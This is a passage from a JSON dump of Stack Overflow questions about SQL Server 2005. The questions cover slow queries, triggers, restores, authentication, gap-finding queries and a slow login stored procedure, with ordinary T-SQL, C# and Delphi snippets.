</p>\n\n<p>I have a PK Clustered index on DataCollectionID.</p>\n\n<p>I have one other index: a Unique Nonclusted index on AssetID, DataPointID, and DatapointDate</p>\n\n<p>I need to run multiple select queries against the table pretty quickly... here is my select Query:</p>\n\n<pre><code>SELECT [DataPointID]\n  ,[SourceTag]\n  ,[DatapointDate]\n  ,[DataPointValue]\nFROM DataCollection\nWhere \n  DatapointDate &gt;= '2012-09-07' AND \n  DatapointDate &lt; '2012-09-08' AND\n  DataPointID = 1100\nORDER BY DatapointDate\n</code></pre>\n\n<p>This query should return 8,640 rows which it does but it takes 00:00:08 (8 seconds) to execute. Even if I said give me top 10 it still takes 8 seconds. Can someone please help me speed up this process?</p>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","signalr"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":137,"score":4,"question_id":12371805,"title":"Push data from Sql Server to desktop application","body":"<p>I have a pretty simple .net 4 desktop application written in c# which needs to display some data inserted to a table on an SQL Server (2005). The data itself is quite simple, just one row of about 10 columns, (mostly counts of other data).</p>\n\n<p>I could just poll the sql server from the application every x interval, but my preference is to have the sql server push the data out to this application if possible, as the timing of the \"new data\" is often irregular.</p>\n\n<p>In short, I'd like to know if this is possible. Doing some research before posting this question, I found a few possibilities.</p>\n\n<p>1) SignalR: I found <a href=\"http://stackoverflow.com/questions/11001205/pushing-data-from-sql-server-to-web-application-with-signalr\">this</a> question which seemed promising, but this seems to be in the context of a web application rather than a desktop one. Upon review of the signalR wiki, it seemed to me that it requires some kind of web service or other http connection which I'd prefer to avoid.</p>\n\n<p>2) Sql server change tracking, from <a href=\"http://stackoverflow.com/questions/6297392/what-is-the-best-way-to-push-inserted-data-out-of-sql-server-to-an-application\">this</a> question. Firstly, I'm not on sql 2008 so I assume I'd have to install or configure it (which isn't a problem) but I'm also not sure if this will provide what I need.</p>\n\n<p>I will mention as well that this client application could exist on 100+ different pcs which would all need to be notified on the data change.</p>\n\n<p>So, is such a thing possible? I apologize if the question is a little vague - and thanks in advance for your help!</p>\n"},{"tags":["c#","asp.net","sql-server-2005","iis","connection-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12372000,"title":"I cannot display data from sql server 2005 express on an ASP.net website running from IIS windows 7","body":"<p>I am using Microsoft server 2003 running sql server 2005 which I have added an asp.net website on IIs.This works perfect. I can display the website on the browser and also read information from the sql server. My problem now arises when I want to do exactly the same but with my laptop which is running sql server 2005 express on windows 7. the websites displays just fine on the localhost but when I login it gives me an error saying that it cannot read files.\nSo my question is that is there a difference between sql server connectionstring and sql server express connection string? or the error is not connectionstring related?</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":951,"score":2,"question_id":3752942,"title":"How to check when autogrowth is done last?","body":"<p>In sql server 2005, the autogrowth is enabled by size. \nIs there any way to check when autogrowth on data and log file happened last?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12143180,"title":"On Update trigger report Variance","body":"<p>I am working on building an alert mechanism system,where when the data in the table is updated an email is triggered to the specific users. The following trigger is working and when data is updated in the system the email is triggered.</p>\n\n<pre><code>ALTER TRIGGER [dbo].[AlertTest]\nON [dbo].[Tbl]\nFOR UPDATE\nAS\n\nDECLARE @xml NVARCHAR(MAX)\nDECLARE @body NVARCHAR(MAX)\n\n\nSET @xml = CAST(( SELECT [No] AS 'td','',[ date] AS 'td','',\n   [lag] AS 'td','', Percentage AS 'td'\nFROM  Tbl\nwhere  \nORDER BY SlNo \nFOR XML PATH('tr'), ELEMENTS ) AS NVARCHAR(MAX))\n\n\nSET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;Report&lt;/H3&gt;\n&lt;table border = 1&gt; \n&lt;tr&gt;\n&lt;th&gt; No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; lag &lt;/th&gt; &lt;th&gt; Percentage &lt;/th&gt;&lt;/tr&gt;'    \n\n\nSET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;'\n\n\nEXEC msdb.dbo.sp_send_dbmail\n@profile_name = 'Alert Email', -- replace with your SQL Database Mail Profile \n@body = @body,\n@body_format ='HTML',\n@recipients = 'abc@gmail.com', -- replace with your email address\n@subject = 'Report' ;\n</code></pre>\n\n<p>The data in the table is of the following format</p>\n\n<pre><code>  No    Date    Days    Percentage\n   1    17-Aug-12   2   -0.34%\n   2    3-Aug-12    15  -29.39%\n   3    27-Jul-12   22  12.02%\n   4    20-Jul-12   29  -0.64%\n   5    13-Jul-12   36  -3.45%\n   6    6-Jul-12    43  -99.93%\n   7    29-Jun-12   50  41.26%\n</code></pre>\n\n<p>I wish to add in a condition and pass it externally for the percentage field where for example:\n1>  The variance is 5 -10% it should select only those values and send as email.\n2>  If the variance is 0.5-1.6% it should select only those values and send in the report.\nKindly advise how this may be achieved?</p>\n\n<p>Thanks</p>\n"},{"tags":["c#","sql","sql-server-2005","sharepoint"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12370944,"title":"The tail of the log for the database \"DBName\" has not been backed up","body":"<p>I tried to restore Database using following query:</p>\n\n<blockquote>\n  <p>ALTER DATABASE [DatabaseName] SET Single_User WITH Rollback Immediate GO</p>\n  \n  <p>RESTORE DATABASE DatabaseName FROM DISK = 'C:\\DBName-Full Database\n  Backup'</p>\n  \n  <p>ALTER DATABASE [DatabaseName] SET Multi_User GO</p>\n</blockquote>\n\n<p>but instead of restoring Database am getting this error,</p>\n\n<blockquote>\n  <p>Msg 3159, Level 16, State 1, Line 2 The tail of the log for the\n  database \"DatabaseName\" has not been backed up. Use BACKUP LOG WITH\n  NORECOVERY to backup the log if it contains work you do not want to\n  lose. Use the WITH REPLACE or WITH STOPAT clause of the RESTORE\n  statement to just overwrite the contents of the log. Msg 3013, Level\n  16, State 1, Line 2 RESTORE DATABASE is terminating abnormally.</p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12368448,"title":"Drop all extended properties on SQL Server","body":"<p>How to drop all extended properties on SQL Server in a scriptable way?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12363441,"title":"How to change SQL Server 2005 from Windows Authentication to SQL Authentication?","body":"<p>I have installed SQL Server 2005 in Windows Authentication, now I want to change it to SQL Authentication.\nHowever, I cannot reinstall SQL SERVER and Management again, because it will lose the data in it.\nAlso I want to know what changes do I need to make in my Connection class to open connection, as my current is  </p>\n\n<pre><code>public SqlConnection con= new sqlConnection(\"server=.\\\\SQLEXPRESS;database=Restaurant;integrated security=sspi\");\n</code></pre>\n\n<p>Just need to ask one more thing, I can see my database in WIndows Auth and in SQL auth, so how can i change, so that any other user need to login before it peeps into my database. thanks</p>\n"},{"tags":["asp.net-mvc","sql-server-2005","excel","csv"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1604,"score":5,"question_id":1559392,"title":"Best method for importing csv or excel file to SQL Server 2005 using .net MVC view","body":"<p>I'm looking for the best method for importing csv or excel file to SQL Server 2005 using .net MVC.</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql-server","sql-server-2005","database-connection","sapb1"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3126,"score":1,"question_id":361062,"title":"When connecting SAP Business One to SQL Server 2005, what is the","body":"<p>we have SAP Business One - Fourth Shift Edition running here at a small manufacturing company.  The consulting company that has come in to do the installation/implementation uses the \"sa\" id/pass to initially connect to the database to get the list of companies.  From then on, I have to assume that its the sa id/pass that is being used to connect the client software to the database.  Is this appropriate?  I dont know where this data is being stored... as an ODBC connection?  directly in the registry somewhere?  Is it secure?  Would it be better to set the users network ID in the database security and then use the \"trusted connection\" setting instead?  Or do most people create a separate login in the database for each user and use that in the client settings?</p>\n\n<p>seems like the easiest way would be to add the users network login to the sql server security so they can use the \"trusted connection\"... but then wouldn't that allow ANY software to connect to the database from that machine?</p>\n\n<p>So anyways: what are the best-practices for setting this up?</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12357803,"title":"SSIS 2005 problems importing to nvarchar(max)","body":"<p>I have some XML files that I do a weekly import from for one of our systems. Four of the pieces of data in the XML range from 450 to 650 characters in length. I have tried everything I can think of but they always get truncated at around 255 characters. I tried setting the landing column to nvarchar(max), varchar(max), varchar(1000) and varchar(600) and none of this worked and I still get the same truncation. I inspected the XML files and the data there looks good. All the rest of the data comes in without truncation - just these four items have issues. I did find out googling around that SSIS considers nvarchar(max) and varchar(max) blob fields so I assume that is why they do not work correctly - but the others ??</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","gaps-and-islands"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1228,"score":6,"question_id":2693171,"title":"Finding gaps (missing records) in database records using SQL","body":"<p>I have a table with records for every consecutive hour. Each hour has some value. I want a T-SQL query to retrieve the missing records (missing hours, the gaps). So for the DDL below, I should get a record for missing hour 04/01/2010 02:00 AM (assuming date range is between the first and last record). Using SQL Server 2005. Prefer a set based query.</p>\n\n<pre><code>DDL:\nCREATE TABLE [Readings](\n    [StartDate] [datetime] NOT NULL,\n    [SomeValue] [int] NOT NULL\n)\nINSERT INTO [Readings]([StartDate], [SomeValue])\nSELECT '20100401 00:00:00.000', 2 UNION ALL\nSELECT '20100401 01:00:00.000', 3 UNION ALL\nSELECT '20100401 03:00:00.000', 45\n</code></pre>\n"},{"tags":["sql","sql-server","database","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12356765,"title":"How to display null if a field's where condition is not met","body":"<p>I've got the following SQL code which returns the tables in my database, along with the primary key field in each table.</p>\n\n<pre><code>SELECT Keys.TABLE_NAME As 'Table Name',\nKeys.COLUMN_NAME AS 'Primary Key'\nFROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS AS Constraints\nJOIN INFORMATION_SCHEMA.KEY_COLUMN_USAGE AS Keys\nON Constraints.TABLE_NAME = Keys.TABLE_NAME\nAND Constraints.CONSTRAINT_NAME = Keys.CONSTRAINT_NAME\nWHERE Constraints.CONSTRAINT_TYPE = 'PRIMARY KEY'\n</code></pre>\n\n<p>As it is, it only displays those tables which have a primary key.  How can I modify the sql to display all tables, and those tables which do not have a primary key will display \"null\" in the \"Primary Key\" column instead?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":373,"score":0,"question_id":4119971,"title":"SQL Server 2005 - How do I find out the disk size of a specific index","body":"<p>How do you find the disk size of a specific index in sql server 2005?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":63,"score":-1,"question_id":12347826,"title":"Special characters in LIKE statement","body":"<p>I am looking to perform the following in SQL Server 2005 but I guess due to the character '#' the <code>LIKE</code> statement does not seem to be returning any result.</p>\n\n<pre><code>SELECT * FROM Table WHERE keyword LIKE '%C#%'\n</code></pre>\n\n<p>Please advice.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12346791,"title":"Multiple replacements in string in single Update Statement in SQL server 2005","body":"<p>I've a table 'tblRandomString' with following data:</p>\n\n<pre><code>ID  ItemValue\n\n1   *Test\"\n2   ?Test*\n</code></pre>\n\n<p>I've another table 'tblSearchCharReplacement' with following data</p>\n\n<pre><code>Original   Replacement\n\n*          `star`\n?          `quest`\n\"          `quot`\n;          `semi`\n</code></pre>\n\n<p>Now, I want to make a replacement in the ItemValues using these replacement.\nI tried this:</p>\n\n<pre><code>Update T1\nSET ItemValue = select REPLACE(ItemValue,[Original],[Replacement])\nFROM dbo.tblRandomString T1\nJOIN\ndbo.tblSpecialCharReplacement T2\nON T2.Original IN ('\"',';','*','?')\n</code></pre>\n\n<p>But it doesnt help me because only one replacement is done per update.</p>\n\n<p>One solution is I've to use as a CTE to perform multiple replacements if they exist.</p>\n\n<p>Is there a simpler way?</p>\n"},{"tags":["sql-server-2005","split","microsoft","sql-view","c5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12346829,"title":"SQL For splitting Zip and City field in Microsoft C5","body":"<p>I have a customer who is running Microsoft C5 as their ERP System, and we are supposed to help them get it integrated to their CRM System. For that i have created an SQL view where i map the fields needed for importing customers according to our import program's standard. The problem is that this version of microsoft C5 stores Zip code and city in the same field, so i need to split it up into a zip field and a city field. The problem is that there isn't really a common pattern of how many whitespaces between zipcode and city, and the zipcodes aren't equally long and so forth. i have tried many string functions, but i bet it's piece of cake to solve if you just know how.</p>\n\n<p>Here are some examples of values in the zipcity collumn i need to split:</p>\n\n<pre><code>D-40883  Ratingen\nN-4300  Sandnes\nS-55117  Jnkping\n3650  lstykke\nPL - 58-100 swidnica dlaska\n</code></pre>\n\n<p>As you see, here we got a mix of german, danish, norwegian, swedish and polish zipcodes an citynames. This is what i need to have splitted. </p>\n\n<p>I Don't know whether i should try with a regular expression? I am not very skilled in using regular expressions, so help would be much appreciated.</p>\n"},{"tags":["sql","tsql","sql-server-2005","gaps-and-islands"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":638,"score":3,"question_id":3609687,"title":"Iterating through dates in SQL","body":"<p>I have a table of data that looks a bit like this:</p>\n\n<pre><code>Name    StartTime              FinishTime              Work\nBob     2010-08-03 08:00:00    2010-08-03 12:00:00     4\nBob     2010-08-03 13:00:00    2010-08-03 16:00:00     3\nPete    2010-08-04 08:00:00    2010-08-04 12:00:00     4\nMark    2010-08-04 10:00:00    2010-08-04 12:00:00     2\n</code></pre>\n\n<p>None of these date ranges should ever span over midnight.<br>\nI want to write SQL that will give me the following output, given an input Start Date of 2010-08-02 and a Finish Date of 2010-08-05</p>\n\n<pre><code>Date          Name   TotalWork\n2010-08-03    Bob    7\n2010-08-03    Pete   3\n2010-08-04    Pete   4\n2010-08-04    Mark   2 \n</code></pre>\n\n<p>I could live with, and in fact may ultimately need, to have any days that do not have work associated also be represented in the results set, maybe as a row like this:</p>\n\n<pre><code>2010-08-05     NULL   0\n</code></pre>\n\n<p>I'm not quite sure how to iterate through dates in SQL in the same way that I would with other languages.</p>\n\n<p>To give this some context, the output of this will ultimately plug into a Stacked Chart .Net control.</p>\n\n<p>Could someone give me a clue, a link to a tutorial or some other help?  Otherwise I think I'll be fiddling with this for days!</p>\n\n<p>Thank you!</p>\n\n<p>Jonathan</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","gaps-and-islands"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":764,"score":0,"question_id":1659580,"title":"Generate missing dates + Sql Server (SET BASED)","body":"<p>I have the following </p>\n\n<pre><code>id eventid  startdate enddate\n\n1 1     2009-01-03 2009-01-05\n1 2     2009-01-05 2009-01-09\n1 3     2009-01-12 2009-01-15\n</code></pre>\n\n<p>How to generate the missing dates pertaining to every eventid?</p>\n\n<p>Edit:\n<strong>The missing gaps are to be find out based on the eventid's. e.g. for eventid 1 the output should be 1/3/2009,1/4/2009,1/5/2009.. for eventtype id 2 it will be 1/5/2009, 1/6/2009... to 1/9/2009 etc</strong></p>\n\n<p>My task is to find out the missing dates between two given dates.</p>\n\n<p>Here is the whole thing which i have done so far</p>\n\n<pre><code>declare @tblRegistration table(id int primary key,startdate date,enddate date)\ninsert into @tblRegistration \n    \tselect 1,'1/1/2009','1/15/2009'\ndeclare @tblEvent table(id int,eventid int primary key,startdate date,enddate date)\ninsert into @tblEvent \n    \tselect 1,1,'1/3/2009','1/5/2009' union all\n    \tselect 1,2,'1/5/2009','1/9/2009' union all\n    \tselect 1,3,'1/12/2009','1/15/2009'\n\n;with generateCalender_cte as\n(\n    select cast((select  startdate from @tblRegistration where id = 1 )as datetime) DateValue\n       union all\n        select DateValue + 1\n        from    generateCalender_cte   \n        where   DateValue + 1 &lt;= (select enddate from @tblRegistration where id = 1)\n)\nselect DateValue as missingdates from generateCalender_cte\nwhere DateValue not between '1/3/2009' and '1/5/2009'\nand DateValue not between '1/5/2009' and '1/9/2009'\nand DateValue not between '1/12/2009'and'1/15/2009'\n</code></pre>\n\n<p>Actually what I am trying to do is that, I have generated a calender table and from there I am trying to find out the missing dates based on the id's</p>\n\n<p>The ideal output will be</p>\n\n<pre><code>eventid                    missingdates\n\n1             2009-01-01 00:00:00.000\n\n1             2009-01-02 00:00:00.000\n\n3             2009-01-10 00:00:00.000\n\n3            2009-01-11 00:00:00.000\n</code></pre>\n\n<p>and also it has to be in SET BASED and the start and end dates should not be hardcoded</p>\n\n<p>Thanks in adavnce</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12339295,"title":"Stored procedure and linked server","body":"<p>I have a stored procedure, which contains a simple select statement:</p>\n\n<pre><code>        ALTER PROCEDURE [dbo].[TransferAuditRecords] \nAs\nSET NOCOUNT ON\nSET XACT_ABORT ON\n\nDeclare @UserCode As varchar(50)\n\nDECLARE AuditCursor CURSOR FOR\n        select top 1 UserCode from [AuditDatabaseServer].AuditDatabase.dbo.dbaudit where auditdate &gt;= '2012-09-04'  \n        Open AuditCursor\n        FETCH NEXT FROM AuditCursor INTO @UserCode\n        WHILE @@FETCH_STATUS = 0  \n            BEGIN\n                Print @Usercode\n                FETCH NEXT FROM AuditCursor INTO @UserCode\n            END\n\n    Close AuditCursor \n    Deallocate AuditCursor \n</code></pre>\n\n<p>There are a few lines of code missing, which I excluded as they are irrelevant to the question.</p>\n\n<p>If I execute the SQL statement without the stored procedure i.e. in SQL Studio Manager 2005 then I get a different output than if I run the stored procedure i.e. the top reference returned is different.  Why are the outputs different? </p>\n\n<p>I am fairly sure that the reason for this is because SQL Server uses a different execution plan for compiled code is comparison to code being run in SQL Studio Manager.  I wanted to check though.</p>\n"},{"tags":["query","delphi","sql-server-2005","delphi-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":12305761,"title":"SQL query doesnt finish in delphi","body":"<p>Im using SQL Server 2005 with Delphi 2010</p>\n\n<p>I have a table <code>ventas</code> with <code>id_venta</code> (PK)= id_sale, <code>total</code>(of the sale), (more values), <code>estado</code>=state(active/inactive) and <code>cumulative</code>.</p>\n\n<p>The table registers all the sales of articles of a store, and i need to register the cumulative sum of the total row by row. Im using the state field to specify the sales made in the shift if there were more than one shift in the day. Im using this query:</p>\n\n<pre><code>Declare @id integer; \nset @id=(Select min(id_venta) from ventas where estado='activo');\n\nwhile(select @id)&lt;=(Select max(id_venta) from ventas) \n  begin \n    update ventas set acumulado=(select sum(total) from ventas \n    where id_venta&lt;=@id and estado='activo') where id_venta=@id\n    select @id=@id+1 \n  end \n</code></pre>\n\n<p>This query does exacly what i want when i run it on SQL but when i do it on delphi it only gives me the comulative of about 151 rows of 431, not finishing.</p>\n\n<p>This is my delphi code:</p>\n\n<pre><code>conect.Q_equivalencias.Active:=false;\nconect.Q_equivalencias.SQL.Clear;\nconect.Q_equivalencias.SQL.Add('Declare @id integer; set @id=(Select min(id_venta) from ventas where estado='+char(39)+'activo'+char(39)+' );');\nconect.Q_equivalencias.SQL.Add('while(select @id)&lt;=(Select max(id_venta) from ventas) begin');\nconect.Q_equivalencias.SQL.Add('update ventas set acumulado=(select sum(total) from ventas  ');\nconect.Q_equivalencias.SQL.Add('where id_venta&lt;=@id and estado='+char(39)+'activo'+char(39)+') where id_venta=@id');\nconect.Q_equivalencias.SQL.Add('select @id=@id+1 end');\nconect.Q_equivalencias.ExecSQL;\n</code></pre>\n\n<p>What do i have to do so my query in Delphi finishes?</p>\n\n<p>Edit:</p>\n\n<p>Strange thing just happened, i tried with <code>conect.Q_equivalencias.Open;</code> insted of <code>conect.Q_equivalencias.ExecSQL;</code> and ofcourse it throw me an <code>error creating cursor handler</code>\nbut it finished the query, all rows were updated, why is that? </p>\n\n<p>Tried many things and it seems that my query on delphi only updates 152 rows...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12320658,"title":"SQL Making Null Value in all columns which has a same value","body":"<p>I have a scenario in which i generate a temp table in that table i have to remove the repeating values like....</p>\n\n<pre><code>id      Ref_No  css_no  haz_no  Emp_no  X-Fac       Y-Fac   Location    street_name     Locale  town_name   admin_area\n341139  317000334   NULL    NULL    37101195    588550.00   185922.00       SUTTON ROAD     SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    582297.00   582297.00   ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    85000.00    85000.00    ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    85000.00    85000.00    ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477649  317000334   NULL    NULL    37100004    591278.00   591278.00   aaaaaaaaaaaaaaaaaaaa    ACACIA DRIVE    THORPE BAY  SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477651  317000334   NULL    NULL    37101738    593365.00   593365.00   adfasdsfwerwer  ADJACENT TO 51 SANDPIPER CLOSE  SHOEBURYNESS    SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477661  317000334   NULL    NULL    37100036    589791.00   187149.00       ARCHER AVENUE       SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n487012  317000334   NULL    NULL    42203885    359280.00   359280.00   yuiuyiuy    ABERDARE CLOSE  BURTONWOOD AND WESTBROOK    WARRINGTON  WARRINGTON\n</code></pre>\n\n<p>I want this table output as......</p>\n\n<pre><code>id      Ref_No  css_no  haz_no  Emp_no  X-Fac       Y-Fac   Location    street_name     Locale  town_name   admin_area\n    341139  317000334   NULL    NULL    37101195    588550.00   185922.00       SUTTON ROAD     SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477641  317000334   NULL    NULL    37100003    582297.00   582297.00   ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n                        NULL    NULL                85000.00    85000.00    \n                        NULL    NULL                85000.00    85000.00    \n    477649  317000334   NULL    NULL    37100004    591278.00   591278.00   aaaaaaaaaaaaaaaaaaaa    ACACIA DRIVE    THORPE BAY  SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477651  317000334   NULL    NULL    37101738    593365.00   593365.00   adfasdsfwerwer  ADJACENT TO 51 SANDPIPER CLOSE  SHOEBURYNESS    SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477661  317000334   NULL    NULL    37100036    589791.00   187149.00       ARCHER AVENUE       SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    487012  317000334   NULL    NULL    42203885    359280.00   359280.00   yuiuyiuy    ABERDARE CLOSE  BURTONWOOD AND WESTBROOK    WARRINGTON  WARRINGTON\n</code></pre>\n\n<p>Like wise i need to remove the value which are returning again and agin for the same infomartion... can any one help me with this.... and the table wi'll be generated according with the condition each time so the values may not be same all time...</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12325043,"title":"A stored procedure works only when I restart the SQL Server Database Server","body":"<p>In one my company's internal projects built on C#, ASP.Net, SQL server 2005 and Windows Server 2008, the login stored procedure just takes infinite amount of time when some one tries to login. But when I restart the database server, the problem is fixed. This happens everyday. This might not be database load problem as other stored procedures just work fine. Also if I pull out the query inside the stored procedure, I get the results in proper time. In the stored procedure apart from fetching data there is an if condition which restricts users to some IPs only. </p>\n\n<p>I don't know what the problem is. Can some one please help me in figuring out the problem.\nThanks in advance.</p>\n\n<p>Here is the Stored Procedure</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[get_user]          \n@username varchar(50), @pwd varchar(50), @passcode varchar(50), @ipaddress varchar(15)          \nAS          \nBEGIN          \n IF(@ipaddress = 'aaa.aaa.aaa.aaa' OR @ipaddress = 'aaa.aaa.aaa.aaa' OR @ipaddress = 'aaa.aaa.aaa.aaa')          \n BEGIN          \n  IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_status='Y')          \n  BEGIN          \n   DECLARE @ri_date_time varchar(20)          \n   SET @ri_date_time=convert(varchar(50),getdate(),120)          \n   DECLARE @user_exists as int          \n   Set @user_exists = 0          \n   Set @user_exists = (Select count(*) from tbl_recent_items (nolock) where ri_user_name=@username)          \n   IF @user_exists = 0          \n   BEGIN          \n    BEGIN TRAN          \n     INSERT INTO tbl_recent_items (ri_user_name, ri_access_date_time) values (@username, @ri_date_time+'|'+@ipaddress+'^')          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n   ELSE          \n   BEGIN          \n    DECLARE @datetext varchar(max)          \n    SET @datetext = (select isnull(ri_access_date_time,'') from tbl_recent_items(nolock) where  ri_user_name=@username)          \n    SET @datetext=@ri_date_time+'|'+@ipaddress+'^'+@datetext          \n    BEGIN TRAN          \n     UPDATE tbl_recent_items Set ri_access_date_time=@datetext where ri_user_name = @username          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n  END          \n  SELECT CONVERT(varchar(4),up_id) as up_id,LTRIM(RTRIM(isnull(up_user_name,''))) as u_user_name,           \n  ISNULL(up_password,'') as u_user_password,isnull(up_first_name,'') as up_first_name,           \n  ISNULL(up_middle_name,'') as up_middle_name, isnull(up_last_name,'') as up_last_name,           \n  ISNULL(up_branch_id,'') as up_branch_id, isnull(b_branch_id,'') as b_branch_id,          \n  ISNULL(b_branch_name,'') as b_branch_name,isnull(up_mobile_phone,'') as up_mobile_phone,          \n  --ISNULL(up_pager_phone,'') as up_pager_phone,  \n  isnull(up_email,'') as up_email,          \n  ISNULL(up_status,'') as u_status,   \n  --isnull(up_job_posting_phone,'') as up_job_posting_phone,          \n--  ISNULL(up_level,'') as up_level, \n    isnull(up_trainee,'0') as up_trainee,          \n  ISNULL(up_senior,'0') as up_senior, isnull(up_team_lead,'0') as up_team_lead, isnull(up_ist,'0')as up_ist, up_hyd_branch,    \n  convert(varchar(10),up_password_date,102)as up_password_date    \n  FROM tbl_user_profile (nolock)           \n  LEFT OUTER JOIN tbl_branches (nolock) on up_branch_id = b_id where           \n  up_user_name = @username and up_password =@pwd          \n END          \n IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_user_name = @username and up_password = @pwd and up_passcode = @passcode and up_status='Y')          \n BEGIN          \n  IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_status='Y')          \n  BEGIN          \n   DECLARE @ri_date_time1 varchar(20)          \n   SET @ri_date_time1=convert(varchar(50),getdate(),120)          \n   DECLARE @user_exists1 as int          \n   Set @user_exists1 = 0          \n   Set @user_exists1 = (Select count(*) from tbl_recent_items (nolock) where ri_user_name=@username)          \n   IF @user_exists1 = 0          \n   BEGIN          \n    BEGIN TRAN          \n     INSERT INTO tbl_recent_items (ri_user_name, ri_access_date_time) values (@username, @ri_date_time1+'|'+@ipaddress+'^')          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n   ELSE          \n   BEGIN          \n    DECLARE @datetext1 varchar(max)          \n    SET @datetext1 = (select isnull(ri_access_date_time,'') from tbl_recent_items(nolock) where  ri_user_name=@username)          \n    SET @datetext1=@ri_date_time1+'|'+@ipaddress+'^'+@datetext1          \n    BEGIN TRAN          \n     UPDATE tbl_recent_items Set ri_access_date_time=@datetext1 where ri_user_name = @username          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n  END          \n  SELECT CONVERT(varchar(4),up_id) as up_id,LTRIM(RTRIM(isnull(up_user_name,''))) as u_user_name,           \n  ISNULL(up_password,'') as u_user_password,isnull(up_first_name,'') as up_first_name,           \n  ISNULL(up_middle_name,'') as up_middle_name, isnull(up_last_name,'') as up_last_name,           \n  ISNULL(up_branch_id,'') as up_branch_id, isnull(b_branch_id,'') as b_branch_id,          \n  ISNULL(b_branch_name,'') as b_branch_name,isnull(up_mobile_phone,'') as up_mobile_phone,          \n  --ISNULL(up_pager_phone,'') as up_pager_phone,  \n  isnull(up_email,'') as up_email,          \n  ISNULL(up_status,'') as u_status,  \n   --isnull(up_job_posting_phone,'') as up_job_posting_phone,          \n--  ISNULL(up_level,'') as up_level, \n isnull(up_trainee,'0') as up_trainee,          \n  ISNULL(up_senior,'0') as up_senior, isnull(up_team_lead,'0') as up_team_lead,isnull(up_ist,'0')as up_ist, up_hyd_branch,    \n  convert(varchar(10),up_password_date,102)as up_password_date    \n  FROM tbl_user_profile (nolock)           \n  LEFT OUTER JOIN tbl_branches 